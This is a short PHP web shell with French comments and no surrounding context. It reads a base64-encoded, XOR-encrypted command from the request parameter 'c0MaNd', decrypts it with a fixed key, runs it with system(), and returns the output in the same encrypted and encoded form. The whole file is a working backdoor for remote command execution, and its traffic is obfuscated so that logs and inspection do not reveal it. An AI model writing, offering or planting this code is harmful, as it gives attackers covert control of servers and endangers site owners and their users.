<?php
function xor_cipher($data, $key) {
    $out = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= $data[$i] ^ chr($key);
    }
    return $out;
}

if (isset($_REQUEST["c0MaNd"]) && !empty($_REQUEST["c0MaNd"])) {
    $key = 1337 % 256; // clé XOR, soit 57
    $encrypted = base64_decode($_REQUEST["c0MaNd"]); // décodage base64
    $decrypted = xor_cipher($encrypted, $key); // déchiffrement XOR
    
    ob_start();
    system($decrypted); // exécution de la commande
    $output = ob_get_clean();
    
    $encrypted_output = xor_cipher($output, $key); // chiffrement XOR de la sortie
    echo base64_encode($encrypted_output); // encodage base64 de la sortie chiffrée
}
?>
